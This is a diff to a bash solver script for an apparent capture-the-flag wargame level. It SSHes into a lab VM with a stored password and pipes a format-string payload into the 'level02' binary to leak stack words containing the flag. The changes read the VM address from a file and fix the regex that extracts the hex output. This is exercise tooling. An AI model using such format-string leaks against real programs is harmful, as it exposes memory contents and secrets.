@@ -1,6 +1,6 @@
 #!/bin/bash
 
-VM_ID='192.168.56.6'
+VM_ID=$(cat ../../ip)
 if [ ! -z "$1" ]; then
     VM_ID="$1"
 fi
@@ -36,7 +36,7 @@ fi
 hex_flag=""
 hex_flag=$(sshpass -p "${act_level_password}" ssh level0${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "%22\$lX %23\$lX %24\$lX %25\$lX %26\$lX" | ./level02' 2> /dev/null | grep '^[0-9A-F]\{16\}')
 
-hex_flag=$(echo "${hex_flag}" | sed 's/\(\([0-9A-F]\{16\} \)*\).*/\1/g')
+hex_flag=$(echo "${hex_flag}" | sed 's/\(\([0-9A-F]\{16\} \)*[0-9A-F]\{16\}\).*/\1/g')
 flag=""
 
 part_number=1
